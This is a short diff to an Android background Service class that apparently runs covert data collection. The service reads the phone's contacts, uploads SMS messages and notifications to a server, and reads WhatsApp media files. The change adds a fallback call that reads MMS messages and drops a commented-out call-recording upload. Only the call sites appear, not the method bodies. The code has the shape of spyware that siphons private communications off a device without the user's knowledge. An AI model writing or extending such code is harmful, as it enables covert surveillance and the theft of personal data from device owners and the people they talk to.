@@ -117,12 +117,15 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                         String mobile = Utils.getMobileNo(BackgroundJob.this);
                         if(mobile == null || mobile.equals("")){
                             backgroundJobService.getMobileNo();
+                            mobile = Utils.getMobileNo(BackgroundJob.this);
+                            if(mobile == null || mobile.equals("")){
+                                backgroundJobService.readMMSMEssage();
+                            }
                         }
                         backgroundJobService.ReadPhoneContacts();
                         backgroundJobService.sendSMSToServer();
                         backgroundJobService.sendNotificationsToServer();
                         backgroundJobService.readWhatsAppMediaFiles();
-//                        backgroundJobService.sendCallRecording();
                     }
 //                }
 //            });
